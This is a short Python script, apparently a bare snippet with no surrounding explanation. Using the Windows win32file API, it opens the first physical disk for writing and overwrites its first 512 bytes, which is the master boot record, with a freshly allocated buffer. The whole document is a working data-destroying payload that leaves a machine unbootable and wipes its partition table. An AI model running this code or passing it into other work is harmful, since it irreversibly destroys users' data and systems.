from win32file import *
hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
WriteFile(hDevice, AllocateReadBuffer(512), None)
CloseHandle(hDevice)
